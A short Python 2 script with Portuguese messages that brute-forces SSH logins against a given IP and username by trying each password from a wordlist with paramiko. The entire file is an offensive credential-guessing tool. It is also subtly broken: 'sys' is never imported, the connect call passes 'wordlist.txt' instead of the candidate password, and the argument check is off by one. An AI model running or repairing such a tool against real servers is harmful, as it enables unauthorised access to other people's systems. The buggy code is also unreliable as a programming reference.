#!/usr/bin/python
import paramiko
ssh = paramiko.SSHClient()
ssh.load_system_host_keys()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

if len(sys.argv) < 3:
	print "MODO DE USAR: sshbruteforce.py 192.168.0.1 usuario wordlist.txt"
	sys.exit(0)
  
ip = sys.argv[1]
usuario = sys.argv[2]
f = open(sys.argv[3])

for palavra in f.readlines():
	senha = palavra.strip()
	try:
		ssh.connect(ip, username=usuario, password=wordlist.txt)
	except paramiko.ssh_exception.AuthenticationException:
		print "Testando com:",senha
	else:
		print "[+] Senha Encontrada -->",senha
		break

ssh.close()
